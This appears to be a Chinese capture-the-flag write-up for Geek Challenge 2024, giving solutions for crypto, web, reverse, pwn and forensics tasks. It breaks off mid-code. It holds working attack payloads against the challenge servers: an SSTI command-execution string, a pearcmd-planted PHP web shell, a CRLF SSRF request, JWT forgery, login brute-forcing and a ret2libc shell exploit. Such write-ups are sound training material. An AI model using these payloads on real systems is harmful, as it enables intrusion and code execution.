0x00a146448c980fcf49be5640ea8cfb6278f3b270e54ead35b5ddf65c0bb0eb67594075a68359e90b762dcc59604f2358d907a539b9abcb2736bc59f15614d87035c52d0c2b5fc5f9615e00ac5000972cf1a4dcd83f30c7adda8b0fa3e1314fb046e1d53f202d341b0bd0dfa681072c58926f9e04931e0f3a9093a51e536e2c11a1 生成完整私钥： 1234567891011121314151617181920212223242526from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_OAEPfrom Crypto.Util.number import *n = 19909823107653171578063591352961144331355821517081529017694276790993397379180193511755806958091550033235815834847549265751244192211761569881061742997804509098095297146520946343734939782935970054031389390447526577982809412074573616889663964050032806967234869741452169276495048891650957729859124875343810181695665153129824527065062831773013713479602052423965588148263292672514853749647510938621421264137177666497737099263481269491867593812579958283619882699866915561357437484323854411934718569074869408000191465973545262527827064708529700071967884924505367105288433603597633451764659888020272057850625902629529400734213e = 65537c = 0x3ebcefe91cb56a985a514dacefe4e048c1e805a6a3a1afcdc405812044dce1ce247b1de001b77dcb83ff3f38b392dab34f0d2aabdcb2afe670f104b2dfa04c2ff88b563804993f5ce2babd8a81dbde7f99ffacbfb6a77723a84e6c7d758a4d89667b6e0f9308c9c154b8f8fdafa224fc9364ba2995ab5a4a8a608b43bffa1ae9007ffb224aa45485f861eed1cdfaa34efefdcb03cb12501a7f9ffd2336d86b12339c3ec8ea9f321d6d6a3df566f3325205c7ec84dffc107eabb5b06fcededa419914c61987c0ae11d502fe91846efd548bc1dc9fab733f838fe27e5f0a5452f1cd79e6d3b125f060aef698c30484aa386d6aa44e12871cb2b20ef3bebad1a90cdp = 0x00ba5beaf382f586bf044615f3ec8bf35e0ad0a41cecb213930a86ac35a80d90319a05aa56da311ee8435abe6317eb6d15904fc787d37b34c48daad75d2b77a41d5cec4c27cced07cbda891fefa0d9d7025023bcb865c16c000266a090640032752acce73a3358060c056723e788f42edc8e120e0f58f5e24f327fff1c56687fb1dq = 0x00a146448c980fcf49be5640ea8cfb6278f3b270e54ead35b5ddf65c0bb0eb67594075a68359e90b762dcc59604f2358d907a539b9abcb2736bc59f15614d87035c52d0c2b5fc5f9615e00ac5000972cf1a4dcd83f30c7adda8b0fa3e1314fb046e1d53f202d341b0bd0dfa681072c58926f9e04931e0f3a9093a51e536e2c11a1for x in range(1, e): if(e*dp%x==1): p=(e*dp-1)//x+1 if(n%p!=0): continue q=n//pf = (p-1)*(q-1)d = inverse(e,f) rsa_components = (n, e, d, p, q)myrsa = RSA.construct(rsa_components)private = open(&#x27;private1.pem&#x27;, &#x27;wb&#x27;)private.write(myrsa.exportKey())private.close() openssl解 key.enc： openssl rsautl -decrypt -inkey private1.pem -in key.enc 得到： You_are_r1ght_bu7_Genshin_Impact_1s_@_brand_new_open_wor1d_@dventure_gam3_dev3loped_6y_miHoYo. 作为密码，提取 Ginshen.exe 中的 Ginshen.txt，末尾即为flag： SYC&#123;OVvanSh3nO_Q1D0ng!&#125;。 ​ ECBpad 点击就送！！！！！ ECB模式攻击。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from pwn import *from tqdm import *r=remote(&#x27;nc1.ctfplus.cn&#x27;,45839)def pad(leng): pad_len = block - (leng % block) if leng % block != 0 else 0 return b&#x27;F&#x27; * pad_lensecret_len = 31ori_padding_len = 1block = 16flag = b&#x27;&#x27;padding = [pad(k) for k in range(16)]padding = padding[1:]+[padding[0]]print(padding)for i in range(secret_len): find=0 payload = b&#x27;*&#x27;*(ori_padding_len+i+1) group = i//block r.sendlineafter(b&#x27;[-] &#x27;,b&#x27;yes&#x27;) r.sendlineafter(b&#x27;[-] &#x27;,payload) r.recvuntil(b&#x27;Your cipher:&#x27;) data = r.recvline().strip() if group == 0: prob=data[-32:] else: prob=(data[-32*(group+1):-32*(group+1)+32]) print(f&#x27;&#123;i+1&#125; prob = &#123;prob&#125;&#x27;) for j in trange(32,127): r.sendlineafter(b&#x27;[-] &#x27;,b&#x27;yes&#x27;) flag_suffix = flag[:min(len(flag),15)] payload = bytes([j]) + flag_suffix + padding[min(len(flag_suffix),15)] #print(j,payload) r.sendlineafter(b&#x27;[-] &#x27;,payload) r.recvuntil(b&#x27;Your cipher:&#x27;) data = r.recvline().strip() if data[:32]==prob: flag = bytes([j]) + flag print(f&#x27;&#123;i+1&#125; flag = &#123;flag&#125;&#x27;) print() find=1 break if find == 0: print(f&#x27;&#123;i+1&#125; cannot find!&#x27;) breakr.interactive()# 31 flag = b&#x27;SYC&#123;CRY9T0HACK_A_GREA7_W38S17E&#125;&#x27; ​ Webez_http 原本第一周的签到题放第二周给大家爽爽吧，点击就送 分步补充HTTP请求头： 1234567POST /?welcome=geekchallenge2024Referer: https://www.sycsec.comX-Real-IP: 127.0.0.1Starven: I_Want_Flagusername=Starven&amp;password=qwert123456 得到： give your cookie : token = eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJTdGFydmVuIiwiYXVkIjoiQ3RmZXIiLCJpYXQiOjE3MzAyMDI0MDEsIm5iZiI6MTczMDIwMjQwMSwiZXhwIjoxNzMwMjA5NjAxLCJ1c2VybmFtZSI6IlN0YXJ2ZW4iLCJwYXNzd29yZCI6InF3ZXJ0MTIzNDU2IiwiaGFzRmxhZyI6ZmFsc2V9.y-NlvKN8YH29AHLCFDboNz9WsXuPeUL2fzbmRHrfOAw&lt;br&gt;&lt;!--key is &quot;Starven_secret_key&quot;--&gt;&lt;br&gt; 到 jwt.io，使用key修改jwt为： 12345678910&#123; &quot;iss&quot;: &quot;Starven&quot;, &quot;aud&quot;: &quot;Ctfer&quot;, &quot;iat&quot;: 1729859281, &quot;nbf&quot;: 1729859281, &quot;exp&quot;: 1729866481, &quot;username&quot;: &quot;Starven&quot;, &quot;password&quot;: &quot;qwert123456&quot;, &quot;hasFlag&quot;: true&#125; 得到后修改cookie得到flag： Cookie: token = eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJTdGFydmVuIiwiYXVkIjoiQ3RmZXIiLCJpYXQiOjE3MzAyMDIzMTAsIm5iZiI6MTczMDIwMjMxMCwiZXhwIjoxNzMwMjA5NTEwLCJ1c2VybmFtZSI6IlN0YXJ2ZW4iLCJwYXNzd29yZCI6InF3ZXJ0MTIzNDU2IiwiaGFzRmxhZyI6dHJ1ZX0.8BOl75G67rPQZ2pd2Eq9eTfVYeNJ6QXu3dsYQA6I0cE ​ Can_you_Pass_Me 听GSBP师傅说你是ssti糕手,那就来秒了他 提交表单完成，返回值为200，需要分割绕过 __，|attr 绕过 .，以及16进制绕关键字。 输入Payload: &#123;%print(joiner|attr('_''_init__')|attr('_''_globals__'))|attr('__g''etitem__')('_''_builtins__')|attr('__g''etitem__')('__import__')('o''s')|attr('p''open')('\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\\x7c\\x62\\x61\\x73\\x65\\x36\\x34')|attr('r''ead')()%&#125; 得到结果base64解码为flag。 ​ ez_include web安全修仙之路-听说你学了文件包含？秒了这道题你就进入筑基阶段了 第一步，包含的软连接层数较多时，hash匹配会直接失效造成重复包含： ?file=php://filter/read=convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/starven_secret.php base64解码得到： 123&lt;?php$secret = &quot;congratulation! you can goto /levelllll2.php to capture the flag!&quot;;?&gt; 第二步，根据提示 register_argc_argv = On 和 pearcmd： 用pearcmd写入文件： /levelllll2.php?+config-create+/&amp;syc=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=eval($_GET[1]);?&gt;+/tmp/1.php 再访问： /levelllll2.php?1=system(&quot;env&quot;);&amp;syc=/tmp/1.php 得到flag。 ​ SecretInDrivingSchool 听说这运维一点安全不会 F12查看源码有注释： &lt;!-- 老板非说要防止黑客攻击，把后台登录路由改成了L000G1n.php，每次登录的时候都记不住，就放这里了吧，应该没人看见 --&gt; 访问 L000G1n.php，密码格式为：三位字母+@chengxing，上burpsuite爆破，得到密码：SYC@chengxing。 进入后台页面，广告修改功能，修改源码为：echo readgzfile(&quot;/flag&quot;);，回到首页底部看到flag。 ​ ez_SSRF lhRaMk7写了个计算器网站用来通过他的小升初数学考试，Parar看不惯直接黑了他的网站不给他作弊，你们觉得能让他作弊吗 /www.zip 源码泄露，发现对外用的是 h4d444444.php，对内用的是 calculator.php。 Soapclient+SSRF，控制User-Agent，实现CRLF伪造，参考：利用SoapClient类进行SSRF+CRLF攻击。 修改： 12345678910111213&lt;?php$target = &#x27;http://127.0.0.1/calculator.php&#x27;;$post_string = &#x27;expression=`cat /flag`&#x27;;$headers = array( &#x27;Authorization: Basic YWFhYWFhYWFhYWFhZG1pbjppX3dhbnRfdG9fZ2V0STAwX2luTXlUM3N0&#x27; );$aaa = &#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;.join(&#x27;^^&#x27;,$headers).&#x27;^^Content-Length: &#x27;.(string)strlen($post_string).&#x27;^^^^&#x27;.$post_string;$aaa = str_replace(&#x27;^^&#x27;,&#x27;%0d%0a&#x27;,$aaa);$aaa = str_replace(&#x27; &#x27;,&#x27;%20&#x27;,$aaa);$aaa = str_replace(&#x27;&amp;&#x27;,&#x27;%26&#x27;,$aaa);echo $aaa;?&gt; 发送POST请求： 1234POST /h4d333333.php?location=http://127.0.0.1/calculator.php HTTP/1.1Host: 80-21b464e7-4ccf-4895-803d-98e820b7e112.challenge.ctfplus.cnuser=wupco%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aAuthorization:%20Basic%20YWFhYWFhYWFhYWFhZG1pbjppX3dhbnRfdG9fZ2V0STAwX2luTXlUM3N0%0d%0aContent-Length:%2022%0d%0a%0d%0aexpression=`cat%20/flag` 最后访问 /result 下载得到flag。 ​ Reverse长颈鹿喜欢吃彩虹 长颈鹿想吃彩虹了，可以帮他它长高吃到彩虹吗，它肯定会给你彩虹糖的 ollvm，动调得到key和密文后，发现是一个简单的异或逻辑，逆： 12345678910k = b&#x27;BOb0m0oN&#x27;c = [0x1D, 0x36, 0x73, 0x16, 0x49, 0x2D, 0x1A, 0x1D, 0x29, 0x06, 0x42, 0x2C, 0x76, 0x07, 0x10, 0x0E, 0x7E, 0x39, 0x55, 0x32, 0x75, 0x03, 0x1B, 0x1D, 0x19, 0x5F, 0x52, 0x23, 0x01, 0x03, 0x1D, 0x3F][::-1]flag = [c[i]^k[i%len(k)] for i in range(len(c))]print(bytes(flag[::-1]))# b&#x27;SYC&#123;yOU_girAFe_L0Ve_EaT_W0bN1aR&#125;&#x27; ​ 奇怪的RC4 指令敲一次？不！敲两次！ python解包+pyc反编译，得到源码： 123456789101112131415161718192021222324252627282930313233343536373839from Rc4 import *def xor1(plaintext, xor_list): try: xor_list = [ord(i) for i in xor_list] except: pass try: plaintext = [ord(i) for i in plaintext] except: pass for i in range(len(plaintext)): plaintext[i] ^= xor_list[i] return plaintextdef xor2(plaintext): try: plaintext = [ord(i) for i in plaintext] except: pass for i in range(len(plaintext) - 1): plaintext[i + 1] = plaintext[i] ^ plaintext[i + 1] return plaintextdef enc(plaintext, key, xor_list): plaintext = rc4(plaintext, key) plaintext = xor1(plaintext, xor_list) plaintext = xor2(plaintext) return plaintextplaintext = input(&#x27;please give your input:&#x27;)key = &#x27;SYCFOREVER&#x27;xor_list = list(range(len(plaintext)))cipher = [158, 31, 205, 434, 354, 15, 383, 298, 304, 351, 465, 312, 261, 442, 397, 474, 310, 397, 31, 21, 78, 67, 47, 133, 168, 48, 153, 99, 103, 204, 137, 29, 22, 13, 228, 3, 136, 141, 248, 124, 26, 26, 65, 200, 7]plaintext = enc(plaintext, key, xor_list)for i in range(len(cipher)): if cipher[i] != plaintext[i]: print(&#x27;Wrong&#x27;) exit(1)print(&#x27;You know the flag!!&#x27;) 再反编译 Rc.pyc： 1234567891011121314151617181920212223242526272829303132333435def KSA(key): j = 0 S = list(range(256)) key_length = len(key) for i in range(256): j = (j + S[i] + key[i % key_length]) % 256 S[i], S[j] = (S[j], S[i]) return Sdef PRGA(S): i = 0 j = 0 while True: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = (S[j], S[i]) k = (S[i] + S[j]) % 256 yield kdef rc4(plaintext, key): try: key = [ord(i) for i in key] except: pass try: plaintext = [ord(i) for i in plaintext] except: pass for i in range(len(plaintext)): plaintext[i] += i S = KSA(key) xor_value = PRGA(S) for i in range(len(plaintext)): plaintext[i] ^= int(next(xor_value)) + 6 return plaintext 根据逻辑逆： 123456789101112131415161718192021222324252627282930313233343536373839from z3 import *c = [158, 31, 205, 434, 354, 15, 383, 298, 304, 351, 465, 312, 261, 442, 397, 474, 310, 397, 31, 21, 78, 67, 47, 133, 168, 48, 153, 99, 103, 204, 137, 29, 22, 13, 228, 3, 136, 141, 248, 124, 26, 26, 65, 200, 7]xor_list = list(range(len(c)))for i in range(len(c)-2,-1,-1): c[i+1] ^= c[i]for i in range(len(c)): c[i] ^= xor_list[i]N = 256S = [0] * Nkey = &#x27;SYCFOREVER&#x27;Key = [0] * Nt = c[:]for i in range(N): S[i] = i Key[i] = ord(key[i % len(key)])j = 0for i in range(N): j = (j + S[i] + Key[i]) % N S[i], S[j] = S[j], S[i]i = 0j = 0for k in range(len(t)): i = (i + 1) % N j = (j + S[i]) % N S[i], S[j] = S[j], S[i] t[k] ^= (S[i] + S[j]) % N + 6t = [t[i]-i for i in range(len(t))]print(bytes(t))# b&#x27;SYC&#123;Bel1eve_thAt_you_a3e_Unique_@nd_tHe_beSt&#125;&#x27; ​ 好像是python？ Gir@ffe乱用python命令，得到了一个奇怪的文件，你能分析出完整逻辑吗？ python字节码，扔给gpt还原： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162# 初始标识设置flag = &#x27;SYC&#123;MD5(input)&#125;&#x27;# 提示用户输入print(&#x27;Please input0:&#x27;)input0 = &#x27;&#x27;# 定义函数 test2def test2(s2): key = &#x27;SYC&#x27; length = 18 cipher = [] for i in range(length): # 对每个字符进行 XOR 和其他变换 cipher.append( (ord(s2[i]) ^ i) + ~ord(key[i % 3]) + 1 ) return cipher# 定义函数 testdef test(s, R): result = [] for i in s: # 判断并转换大写字母 if &#x27;A&#x27; &lt;= i &lt;= &#x27;Z&#x27;: result.append(chr((ord(i) - ord(&#x27;A&#x27;) + R) % 26 + ord(&#x27;A&#x27;))) # 判断并转换小写字母 elif &#x27;a&#x27; &lt;= i &lt;= &#x27;z&#x27;: result.append(chr((ord(i) - ord(&#x27;a&#x27;) + R) % 26 + ord(&#x27;a&#x27;))) # 判断并转换数字 elif &#x27;0&#x27; &lt;= i &lt;= &#x27;9&#x27;: result.append(chr((ord(i) - ord(&#x27;0&#x27;) + R) % 10 + ord(&#x27;0&#x27;))) # 其他字符不变 else: result.append(i) return &#x27;&#x27;.join(result)# 初始化变量并进行运算a = 13b = 14c = (a + b) ^ ad = b * 100e = a ^ bm = d - c * 4 + e - 1# 取模运算r = m % 26# 调用 test 和 test2 函数cipher1 = test(input0, r)cipher2 = test2(cipher1)# 定义常量列表num = [-1, -36, 26, -5, 14, 41, 6, -9, 60, 29, -28, 17, 21, 7, 35, 38, 26, 48]# 验证 cipher2 是否与 num 匹配for i in range(18): if cipher2[i] != num[i]: print(&#x27;wrong!&#x27;) breakelse: print(&#x27;Rrrright!&#x27;) 逆： 123456789101112131415161718192021222324def deROT(s, R): result = [] for i in s: if &#x27;A&#x27; &lt;= i &lt;= &#x27;Z&#x27;: result.append(chr((ord(i) - ord(&#x27;A&#x27;) - R) % 26 + ord(&#x27;A&#x27;))) elif &#x27;a&#x27; &lt;= i &lt;= &#x27;z&#x27;: result.append(chr((ord(i) - ord(&#x27;a&#x27;) - R) % 26 + ord(&#x27;a&#x27;))) elif &#x27;0&#x27; &lt;= i &lt;= &#x27;9&#x27;: result.append(chr((ord(i) - ord(&#x27;0&#x27;) - R) % 10 + ord(&#x27;0&#x27;))) else: result.append(i) return &#x27;&#x27;.join(result)c = [-1, -36, 26, -5, 14, 41, 6, -9, 60, 29, -28, 17, 21, 7, 35, 38, 26, 48]r = 14key = b&#x27;SYC&#x27;c1 = [(c[i] - ~key[i % 3] - 1)^i for i in range(len(c))]print(bytes(c1))c2 = deROT(bytes(c1).decode(),r)print(c2)#D0_You_Iik3_python#SYC&#123;ed798fdd74e5c382b9c7fcca88500aca&#125; ​ DH爱喝茶 期待已久的DH终于来到你的家里，你欣喜若狂，但仍需按捺下心思，为DH备好花和茶吧。 除花之后，发现加密逻辑为tea加密，魔改key每次加密时，每个值需要左移6*4位。 逆： 123456789101112131415161718192021222324252627282930313233343536373839404142from Crypto.Util.number import *def rol4(value, shift=6): return ((value &lt;&lt; shift) &amp; 0xFFFFFFFF) | (value &gt;&gt; (32 - shift))def ror4(value, shift=6): return ((value &gt;&gt; shift) | (value &lt;&lt; (32 - shift))) &amp; 0xFFFFFFFFdef decrypt(v, k): v0 = v[0] v1 = v[1] delta = ((k[0]^k[1])&amp; 0xFF) + 0x98765432 x = delta * 32 k0 = k[0] k1 = k[1] k2 = k[2] k3 = k[3] for i in range(32): v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; 5) + k3) v1 = v1 &amp; 0xFFFFFFFF v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1) v0 = v0 &amp; 0xFFFFFFFF x -= delta x = x &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vkey = [0x56789ABC, 0x6789ABCD, 0x789ABCDE, 0x89ABCDEF]key = [rol4(k) for k in key]encrypted = [0x1F85A965,0xEEC063EC,0x5BF1D0B6,0xF2FDE7B0,0xAA38809A,0x670772E9,0x360D24B9,0xE98C688C]final = b&#x27;&#x27;for i in range(len(encrypted)//2-1,-1,-1): now = decrypt(encrypted[2*i:2*(i+1)], key) key[i] = ror4(key[i]) final = long_to_bytes(now[0])[::-1] + long_to_bytes(now[1])[::-1] + finalprint(final)b&#x27;SYC&#123;DH_likes_flower_and_tea!!!!&#125;&#x27; ​ 玩就行了 师傅们思来想去想要给大家搞点乐趣，快来和三叶草娘一起玩游戏吧~ 链接: https://pan.baidu.com/s/1gXKEZJbRhyEfO6BHHQ1bLw?pwd=game 提取码: game Unity游戏，IlSpy 分析 \\玩就行了\\玩就行了_BackUpThisFolder_ButDontShipItWithYourGame\\Managed，关键代码： 12345678910111213141516171819public void SYC()&#123; string hexString = LoadHexDataFromResources(&quot;output&quot;); if (!string.IsNullOrEmpty(hexString)) &#123; string filePath = Path.Combine(Directory.GetParent(Application.dataPath).FullName, &quot;Data.txt&quot;); string directoryPath = Path.GetDirectoryName(filePath); if (!Directory.Exists(directoryPath)) &#123; Directory.CreateDirectory(directoryPath); &#125; File.WriteAllText(filePath, hexString); Debug.Log(&quot;File saved at: &quot; + filePath); &#125; else &#123; Debug.LogError(&quot;Failed to load hex data from resources.&quot;); &#125;&#125; 用AssetStudio加载资源文件 \\玩就行了\\玩就行了_Data\\resources.assets， 导出output内容，16进制转字节，保存为exe文件，逆向找到关键代码： 123456789101112131415161718192021222324int __fastcall main(int argc, const char **argv, const char **envp)&#123; char v4[117]; // [rsp+2Bh] [rbp-55h] BYREF char Str[108]; // [rsp+A0h] [rbp+20h] BYREF int v6; // [rsp+10Ch] [rbp+8Ch] sub_14000181E(argc, argv, envp); strcpy(v4, &quot;GEEK&quot;); sub_1400013B4(&quot;WOW~~Niceeeee to see you here!!!\\n&quot;); sub_1400013B4(&quot;Welcome to GEEK Challenge!!!!!\\n&quot;); sub_1400013B4(&quot;Please input your answer~\\n&quot;); sub_140001360(&quot;%s&quot;, Str); v6 = strlen(Str); sub_14000144B(Str, 20i64); sub_140001596(Str, v4); sub_14000161C(Str, &amp;v4[5]); if ( !strcmp(&amp;v4[5], &quot;0A161230300C2D0A2B303D2428233005242C2D26182206233E097F133A&quot;) ) sub_1400013B4(&quot;G00D!!!&quot;); else sub_1400013B4(&quot;Try again.&quot;); sub_1400013B4(&quot;\\nPress any key to continue...&quot;); getchar(); return 0;&#125; 分析加密逻辑为 ROT20+异或GEEK，解密逻辑：异或GEEK+ROT6，得到flag：SYC&#123;cOnGraduulaTions_mIneR:D&#125;。 ​ CPP_flower 栀子花开啊开~ nop掉几种花指令： 12341. jz xxx; jnz xxx2. call near ptr xxx3. jump4. push xxx retn 大概还原出这样的伪代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566__int64 sub_559D10()&#123; int v0; // eax __int64 v1; // rax _DWORD *v2; // esi int v3; // eax __int64 v5; // [esp-8h] [ebp-23Ch] int v6[41]; // [esp+2Ch] [ebp-208h] BYREF int v7; // [esp+104h] [ebp-130h] int Buf2[52]; // [esp+110h] [ebp-124h] BYREF int i; // [esp+1E0h] [ebp-54h] char v10[36]; // [esp+1ECh] [ebp-48h] BYREF char v11[20]; // [esp+210h] [ebp-24h] BYREF int v12; // [esp+230h] [ebp-4h] int savedregs; // [esp+234h] [ebp+0h] BYREF sub_551127(0x10u); sub_5511C2(v11); v12 = 0; srand(0x7DE9u); sub_551519(); sub_5514B0(v10); LOBYTE(v12) = 1; v0 = sub_55138E(std::cout, &quot;give your input:&quot;); std::ostream::operator&lt;&lt;(v0, sub_551073); sub_551519(); sub_5513F7(std::cin, v10); if ( sub_55181B(v10) == dword_566004 ) &#123; for ( i = 0; i &lt; dword_566004; ++i ) &#123; rand(); v6[0] = sub_551519() % 255; sub_5512E4(v6); &#125; for ( i = 0; i &lt; dword_566004; ++i ) &#123; v2 = sub_55128A(i); v7 = *v2 ^ *sub_551113(i); Buf2[i] = v7; &#125; if ( !j_memcmp(&amp;unk_562C30, Buf2, 4 * dword_566004) ) v3 = sub_55138E(std::cout, &quot;you get it&quot;); else v3 = sub_55138E(std::cout, &quot;Wrong&quot;); std::ostream::operator&lt;&lt;(v3, sub_551073); sub_551519(); LOBYTE(v12) = 0; sub_551438(v10); v12 = -1; sub_551726(v11); LODWORD(v1) = 0; &#125; else &#123; v6[3] = 0; LOBYTE(v12) = 0; sub_551438(v10); v12 = -1; sub_551726(v11); LODWORD(v1) = 0; &#125; v5 = v1; sub_551456(&amp;savedregs, &amp;loc_55A008); return v5;&#125; 逻辑为：先 srand(0x7DE9)，再将输入的每个字符异或 rand()%255。 123456789101112131415#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; int c[50]=&#123;62, 152, 235, 38, 37, 142, 37, 229, 134, 200, 63, 152, 200, 222, 82, 68, 160, 203, 43, 42, 60, 170, 190, 203, 136, 85, 158, 109, 217, 148, 151, 28, 82, 49, 89, 254, 26, 26, 232, 208, 58, 156, 6, 94, 37, 90, 228, 34, 161, 197&#125;; srand(0x7DE9u); for(int i=0;i&lt;50;++i)&#123; printf(&quot;%c&quot;,(rand()%255)^c[i]); &#125; return 0;&#125;// SYC&#123;Y0u_c@n_3nJoy_yhe_Flow3r_anytime_and_anywhere&#125; ​ Pwnsu~~~~ C罗？su~~~~ 直接用ret2libc可解。 12345678910111213141516171819202122232425262728from pwn import *context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)r=remote(&#x27;nc1.ctfplus.cn&#x27;,27612)elf=ELF(&#x27;su_____/csu&#x27;)libc=ELF(&#x27;su_____/libc.so.6&#x27;)puts_plt=elf.plt.putsputs_got=elf.got.putspop_rdi=0x400903ret=0x4005d6back=elf.sym.writesomethingr.sendlineafter(b&#x27;exit.\\n&#x27;,b&#x27;1&#x27;)pl=flat([b&#x27;a&#x27;*(0x80+8),pop_rdi,puts_got,puts_plt,back])r.send(pl)puts_addr=u64(r.recv(6)+b&#x27;\\x00&#x27;*2)success(f&#x27;&#123;puts_addr:x&#125;&#x27;)libc_base=puts_addr-libc.sym.putssuccess(f&#x27;&#123;libc_base:x&#125;&#x27;)system=libc_base+libc.sym.systembinsh=libc_base+next(libc.search(b&#x27;/bin/sh\\x00&#x27;))pl=flat([b&#x27;a&#x27;*(0x80+8),ret,pop_rdi,binsh,system,back])r.send(pl)r.interactive() ​ Week3MiscForensics 听说爱冒险的lhRaMk7师傅最近换了个浏览器，似乎藏了一些有用的东西… 下载链接: https://pan.baidu.com/s/1p_90wi798gG7wuREGQkhvw?pwd=game 提取码: game Geek2024.ad1 文件，文件头为 ADSEGMENTEDFILE，查为AccessData逻辑镜像文件，使用AccessData FTK Imager打开。 提示浏览器，Public/Desktop 目录下有Firefox和Edge的快捷方式，Geek2024/Document 目录下有 Adventure.txt。 base64隐写得到：100011111001011100101110101101100100110000011001001101001010011111100111000110100000，7bits转字符：Geek2024Syc。 寻找火狐浏览器相关文件，在 Geek2024/AppData/Roaming/Mozilla/Firefox/Profiles/uf11qmty.default 中，尝试用firepwd工具还原：python firepwd.py -p Geek2024Syc -d uf11qmty.default 无有效信息，参考：[GKCTF 2021]FireFox Forensics1 关于 Firefox的网站密码存储 下载安装火狐浏览器，新建密码，Win+R，输入 %AppData%\\Mozilla\\Firefox\\Profiles，进入第一个文件夹，替换取出的 key4.db 和 logins.json，重新打开火狐浏览器，进入密码界面，输入主密码 Geek2024Syc，显示密码，得到： 123456网址http://geek2024.welc0me.you用户名Geek2024密码SYC&#123;F1ref0x_F0r3ns1cs_Mas7er&#125; ​ Cryptoecc 椭圆曲线加密，flag前缀为SYC{xx} $M=C_1-kC_2$ 12345678910111213141516171819#Sagep = 93202687891394085633786409619308940289806301885603002539703165565954917915237a = 93822086754590882682502837744000915992590989006575416134628106376590825652793b = 80546187587527518012258369984400999843218609481640396827119274116524742672463F = GF(p)E = EllipticCurve(F,[a,b])k = 58946963503925758614502522844777257459612909354227999110879446485128547020161c1 = E(40485287784577105052142632380297282223290388901294496494726004092953216846111, 81688798450940847410572480357702533480504451191937977779652402489509511335169)c2 = E(51588540344302003527882762117190244240363885481651104291377049503085003152858, 77333747801859674540077067783932976850711668089918703995609977466893496793359)cipher_left = 34210996654599605871773958201517275601830496965429751344560373676881990711573cipher_right = 62166121351090454316858010748966403510891793374784456622783974987056684617905m = (c1-k*c2).xy()m1 = F(cipher_left)/m[0]m2 = F(cipher_right)/m[1]print(bytes.fromhex(hex(m1)[2:])+bytes.fromhex(hex(m2)[2:]))# b&#x27;SYC&#123;Ecc$is!sO@HaRd&#125;&#x27; ​ ezRSA coppersmith，flag前缀为SYC{xx} 已知m高位，coppersmith求解。 12345678910111213n = 98776098002891477120992675696155328927086322526307976337988006606436135336004472363084175941067711391936982491358233723506086793155908108571814951698009309071244571404116817767749308434991695075517682979438837852005396491907180020541510210086588426719828012276157990720969176680296088209573781988504138607511c = 9379399412697943604731810117788765980709097637865795846842608472521416662350816995261599566999896411508374352899659705171307916591351157861393506101348972544843696221631571188094524310759046142743046919075577350821523746192424192386688583922197969461446371843309934880019670502610876840610213491163201385965h = 111518648179416351438603824560360041496706848494616308866057817087295675324528913254309319829895222661760009533326673551072163865e = 3mh=(h+2023)*inverse_mod(2024,n)%nPR.&lt;x&gt; = PolynomialRing(Zmod(n))f = (mh + x)^e - croot=f.small_roots(X=2^150, beta=1)m = mh+root[0]print(bytes.fromhex(hex(m)[2:]))# b&#x27;SYC&#123;crypto_is_very_interesting_why_dont_you_join_us&#125;&#x27; ​ RnoCRT Also gcd!=1 crt+sha256爆破。 12345678910111213141516171819202122232425262728import hashlibfrom Crypto.Util.number import *m=[207867980504656835313307696396607264603, 245036212212570610987366430554968489325, 270836744824069537438646110613439698666, 319275775495422875474878625752594133023, 254268823435329877199449670714528712873, 213093607196415232366564484229844568444, 246921085368773491003187313772615702950]c=[150031581047390726903711035932621949276, 21260202376534810598778595491323328519, 144049733622518360270048059408969512643, 236920143187836025924037873968303507493, 99781504248790469459151935530031893836, 69236016568483424294966410179787943383, 20613188366058016717435734248097940419]x=crt(c,m)l=1for i in range(7): l=lcm(l,m[i])for k in range(10000): y=x+k*l h1=hashlib.sha256(str(y).encode()).hexdigest() h2=hashlib.sha256(long_to_bytes(y)).hexdigest() if h1[:5]==&#x27;6a651&#x27;: print(&#x27;case 1&#x27;) print(k) print(f&#x27;SYC&#123;&#123;&#123;h1&#125;&#125;&#125;&#x27;) if h2[:5]==&#x27;6a651&#x27;: print(&#x27;case 2&#x27;) print(k) print(f&#x27;SYC&#123;&#123;&#123;h2&#125;&#125;&#125;&#x27;) #case 1#3804#SYC&#123;6a651b7ce47b35cc1aca565028fb633fab9e35ca08e45d5ce987a6caeb500465&#125; ​ LLL 基础LLL，flag前缀为SYC{xx} 构造格，加大系数 $K=2^{176}$ 配平： $(m,-1,k)\\begin{bmatrix} 1 &amp; 0 &amp; a \\newline 0 &amp; K &amp; b \\newline 0 &amp; 0 &amp; p \\end{bmatrix}=(m,-K,-c)$ 123456789101112131415from Crypto.Util.number import *a = 169790849804323540946197204708402762862586197604183102589270741859708550301920348112941305999764092197996929298474590062625556806793613268527763774013772685954699561684244945434843656515307801882995934869499880288594142919381501796488815033294127591623260894764750214588993456840404443515671353802614450411717b = 87985708831523238980948938165414984318379459926002798504435964538203443877988599888615810231215118828138306895572062833107988965151522391460216837691927960249874511818878134399363147008042562222910234739940697553852540265617603482995091203105040187460485673579382171260197291783748886765929376179151804062085p = 131724494512065658801039766546788821718063963144467818735768040631367069153816254855229655449559099188694403260044990366292026916085340250077198735215774149087025577263769846650728593180101073940507285459917860726551385227481715873503612683249433020201729190862430476054822102865441136763977415824331858801617K = 2^176M = matrix(ZZ,[[1,0,a],[0,K,b],[0,0,p]])L = 